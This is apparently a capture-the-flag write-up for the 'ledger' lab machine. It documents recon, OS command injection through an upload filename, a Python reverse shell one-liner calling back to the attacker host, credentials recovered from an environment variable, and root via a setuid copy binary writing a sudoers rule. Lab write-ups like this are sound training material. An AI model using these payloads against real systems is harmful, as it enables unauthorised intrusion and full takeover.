# ledger

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| ledger | noneofyour | easy | hackmyvm |

**Summary:** The ledger machine exposes a Python Werkzeug web application called SimpleLedger on port 5000 alongside SSH on port 22. Gobuster directory enumeration discovers an upload endpoint and a report page. The upload endpoint accepts CSV file submissions but fails to sanitize the filename, allowing shell metacharacter injection through the multipart form data filename field. By crafting a filename containing a semicolon and a reverse shell command, arbitrary code execution is achieved as the www-data user. During post exploitation, an environment variable named SL_META contains a base64 encoded string that decodes to credentials for the finance user, enabling lateral movement via SSH. SUID binary enumeration then reveals a custom binary called ledger-archiver at /usr/local/bin/ledger-archiver, which is a setuid root C program that copies a source file to an arbitrary destination path without any validation. This primitive is exploited by writing a sudoers rule granting the finance user full passwordless sudo access into /etc/sudoers.d/finance, after which sudo -i drops directly into a root shell and both flags are retrieved.

---

## Reconnaissance

The assessment began with host discovery and comprehensive port scanning against the target.

1. A ping sweep was performed to identify active hosts on the 192.168.56.0/24 network:

```zsh
~/projects/iso/creation/ledger                                                                                                    04:44:24  
❯ nmap -sn 192.168.56.0/24     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-02 04:44 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.0018s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00040s latency).  
Nmap scan report for 192.168.56.156  
Host is up (0.0020s latency).  
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.23 seconds
```

2. A full TCP port scan with service version detection and script scanning was executed against the identified target at 192.168.56.156:

```zsh
~/projects/iso/creation/ledger                                                                           04:44:44
❯ ip=192.168.56.156 

~/projects/iso/creation/ledger                                                                                                    04:45:13  
❯ nmap -p- -Pn -sCV -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-02 04:45 +0700  
Nmap scan report for 192.168.56.156  
Host is up (0.00020s latency).  
Not shown: 65533 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)  
5000/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)  
|_http-server-header: Werkzeug/3.1.8 Python/3.13.5  
|_http-title: SimpleLedger \xE2\x80\x94 Internal Accounting  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
   
Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds  
```

The scan identified SSH on port 22 and a Werkzeug Python web application titled SimpleLedger, an internal accounting system, on port 5000.

![](machines/ledger/images/image.png)

3. Web content enumeration was performed using Gobuster with a common wordlist and file extensions:

```zsh
~/projects/iso/creation/ledger                                                                                                  9s 04:45:30  
❯ gobuster dir -u http://$ip:5000/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html  
==============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
==============================================================  
[+] Url:                    http://192.168.56.156:5000/  
[+] Method:                 GET  
[+] Threads:                10  
[+] Wordlist:               /usr/share/seclists/Discovery/Web-Content/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:             gobuster/3.8.2  
[+] Extensions:             html,txt,php  
[+] Timeout:                10s  
==============================================================  
Starting gobuster in directory enumeration mode  
==============================================================  
report               (Status: 200) [Size: 6706]  
upload               (Status: 405) [Size: 153]  
Progress: 19008 / 19008 (100.00%)  
==============================================================  
Finished  
==============================================================
```

The enumeration discovered a `/report` page returning HTTP 200 and an `/upload` endpoint returning HTTP 405, indicating that the upload endpoint accepts POST requests but not GET requests.

---

## Initial Access

### Filename Injection in CSV Upload

4. A Python script was crafted to test the upload endpoint for filename injection by submitting a CSV file with a crafted filename containing shell metacharacters:

```zsh
~/projects/iso/creation/ledger                                                                    ledger 05:03:02
❯ cat post.py
import requests
url = "http://192.168.56.156:5000/upload"
files = {"csvfile": ("test.csv;id;.csv", b"hello", "text/csv")}
r = requests.post(url, files=files)
print(r.text)

~/projects/iso/creation/ledger                                                                    ledger 05:05:00
❯ python3 post.py | grep "uid"
  cashflow (cf)            show changes in liquid assets
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

The filename `test.csv;id;.csv` was interpreted by the server, and the `id` command was executed as part of file processing, returning `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. This confirmed an OS command injection vulnerability through the multipart filename field in the upload endpoint.

5. A reverse shell payload was assembled using the same filename injection technique, embedding a Python reverse shell command within the filename:

```zsh
~/projects/iso/creation/ledger                                                                 5s ledger 05:56:36
❯ cat post.py 
import requests
url = "http://192.168.56.156:5000/upload"
cmd = "test.csv;setsid python3 -c 'import socket,os;s=socket.socket();s.connect((\"192.168.56.1\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];os.execlp(\"sh\",\"sh\")';.csv"
files = {"csvfile": (cmd, b"hello", "text/csv")}
r = requests.post(url, files=files)
print(r.status_code)
```

6. A reverse shell listener was started using penelope on port 4444:

```zsh

~/projects/iso/creation/ledger                                                                           05:55:30
❯ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.0.6 • 192.168.56.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

7. The payload script was triggered, and the reverse shell connected back:

```zsh
~/projects/iso/creation/ledger                                                                    ledger 05:29:40  
❯ python3 post.py  
200
```

```zsh
[+] [New Reverse Shell] => ledger 192.168.56.156 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>  
[+] ⭐ Agent deployed via /usr/bin/python3  
[+] Interacting with session [1] • PTY • Menu key F12 ⇐  
[+] Session log: /home/setyanoegraha/.penelope/sessions/ledger~192.168.56.156-Linux-x86_64/2026_09_02-05_56_31-258  
-www-data_33.log  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
www-data@ledger:~/simpleledger$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

An interactive shell as the www-data user was established on the target machine named ledger.

---

## Lateral Movement

### Environment Variable Credential Recovery

8. During post exploitation reconnaissance, user accounts were enumerated and an environment variable was discovered containing encoded credentials:

```zsh
www-data@ledger:~/simpleledger$ cat /etc/passwd | grep "sh$"  
root:x:0:0:root:/root:/bin/bash  
finance:x:1001:1001::/home/finance:/bin/bash
www-data@ledger:~/simpleledger$ env | grep META
SL_META=ZmluYW5jZToxMjBBZjA4aGYpYXNkQXJx
www-data@ledger:~/simpleledger$ echo 'ZmluYW5jZToxMjBBZjA4aGYpYXNkQXJx' | base64 -d
finance:120Af08hf)asdArq
```

The environment variable `SL_META` contained a base64 encoded string that decoded to the credentials `finance:120Af08hf)asdArq`.

9. The recovered credentials were used to establish an SSH session as the finance user:

```zsh
~/projects/iso/creation/ledger                                                                    ledger 05:56:47
❯ ssh finance@$ip
finance@192.168.56.156's password: 
Linux ledger 6.12.107+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.107-1 (2026-08-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  1 18:27:08 2026 from 192.168.56.1
finance@ledger:~$ id;whoami;hostname
uid=1001(finance) gid=1001(finance) groups=1001(finance)
finance
ledger
finance@ledger:~$ cat user.txt 
HMV{user-8b0...}
```

The user flag was retrieved from `/home/finance/user.txt`.

---

## Privilege Escalation

### SUID ledger-archiver Binary Exploitation

10. SUID binary enumeration was performed to identify potential privilege escalation vectors:

```zsh
finance@ledger:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 118168 Apr 19  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 18816 Jul 31 11:34 /usr/bin/newgrp
-rwsr-xr-x 1 root root 52936 Apr 19  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 88568 Apr 19  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 306456 Apr 11 08:21 /usr/bin/sudo
-rwsr-xr-x 1 root root 72072 Jul 31 11:34 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 Apr 19  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 55688 Jul 31 11:34 /usr/bin/umount
-rwsr-xr-x 1 root root 84360 Jul 31 11:34 /usr/bin/su
-rwsr-xr-x 1 root root 16320 Sep  1 09:02 /usr/local/bin/ledger-archiver
-rwsr-xr-- 1 root messagebus 51272 Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 498240 May  6 08:33 /usr/lib/openssh/ssh-keysign
```

A nonstandard SUID binary was identified at `/usr/local/bin/ledger-archiver`, owned by root and dated September 1.

11. The binary was examined to understand its functionality and its source code was found in the /opt directory:

```zsh
finance@ledger:~$ ledger-archiver   
Usage: ledger-archiver <source-file> <destination-file>  
Archive a ledger file into the protected backup store.  
finance@ledger:~$ ls -la /opt/  
total 12  
drwxr-xr-x  3 root root 4096 Sep  1 09:02 .  
drwxr-xr-x 18 root root 4096 Sep  1 06:35 ..  
drwxrwxr-x  2 root root 4096 Sep  1 09:02 ledger-archiver  
finance@ledger:~$ ls -la /opt/ledger-archiver/ledger-archiver.c   
-rw-r--r-- 1 root root 1423 Sep  1 09:02 /opt/ledger-archiver/ledger-archiver.c
```

```zsh
finance@ledger:~$ cat /opt/ledger-archiver/ledger-archiver.c 
/*
 * ledger-archiver - archive (copy) a ledger file into the protected backup store.
 *
 * The backup storage lives under a root-owned directory, so this helper is
 * installed setuid root in order to read the source and write the destination
 * with root privileges.
 *
 * Usage: ledger-archiver <source-file> <destination-file>
 *
 * Build: gcc -o ledger-archiver ledger-archiver.c
 *        chown root:root ledger-archiver
 *        chmod 4755 ledger-archiver
 */
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <source-file> <destination-file>\n", argv[0]);
        fprintf(stderr, "Archive a ledger file into the protected backup store.\n");
        return 1;
    }

    int fd_in = open(argv[1], O_RDONLY);
    if (fd_in < 0) {
        perror("open source");
        return 1;
    }

    int fd_out = open(argv[2], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_out < 0) {
        perror("open destination");
        close(fd_in);
        return 1;
    }

    char buf[4096];
    ssize_t n;
    while ((n = read(fd_in, buf, sizeof(buf))) > 0) {
        if (write(fd_out, buf, n) != n) {
            perror("write");
            close(fd_in);
            close(fd_out);
            return 1;
        }
    }

    close(fd_in);
    close(fd_out);
    printf("Archived %s -> %s\n", argv[1], argv[2]);
    return 0;
}
```

The source code revealed that the binary is a simple file copy utility that takes a source file and a destination file as arguments, opening the source read only and creating the destination with mode 0644. Crucially, the binary performs no validation on the destination path, meaning it can write to any file on the filesystem with root privileges.

12. The arbitrary file write primitive was exploited by creating a sudoers rule and copying it into the /etc/sudoers.d/ directory:

```zsh
finance@ledger:~$ echo 'finance ALL=(ALL) NOPASSWD: ALL' > /tmp/sudo
finance@ledger:~$ /usr/local/bin/ledger-archiver /tmp/sudo /etc/sudoers.d/finance
Archived /tmp/sudo -> /etc/sudoers.d/finance
finance@ledger:~$ sudo -l
Matching Defaults entries for finance on ledger:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User finance may run the following commands on ledger:
    (ALL) NOPASSWD: ALL
finance@ledger:~$ sudo -i
root@ledger:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
ledger
root@ledger:~# cat root.txt 
HMV{root-972...}
```

The ledger-archiver binary copied the file containing `finance ALL=(ALL) NOPASSWD: ALL` into `/etc/sudoers.d/finance`, granting the finance user full passwordless sudo access. A subsequent `sudo -i` dropped into a root shell, and the root flag was retrieved from `/root/root.txt`.

---

## Attack Chain Summary

1. **Reconnaissance**: Nmap scanning identified SSH on port 22 and a Werkzeug Python web application called SimpleLedger on port 5000. Gobuster discovered an upload endpoint and a report page.
2. **Vulnerability Discovery**: The upload endpoint accepted CSV files with unsanitized filenames, allowing shell metacharacter injection through the multipart form data filename field, confirmed by executing the id command as www-data.
3. **Exploitation**: A reverse shell payload was embedded in the uploaded filename, establishing an interactive shell as the www-data user on the target machine.
4. **Internal Enumeration**: Post exploitation reconnaissance discovered an environment variable SL_META containing a base64 encoded credential string that decoded to finance:120Af08hf)asdArq, enabling lateral movement via SSH. SUID enumeration revealed a custom setuid root binary called ledger-archiver at /usr/local/bin/ledger-archiver with an arbitrary file write vulnerability.
5. **Privilege Escalation**: The ledger-archiver binary was used to write a sudoers rule granting the finance user full passwordless sudo access into /etc/sudoers.d/finance, after which sudo -i dropped directly into a root shell and the root flag was retrieved.
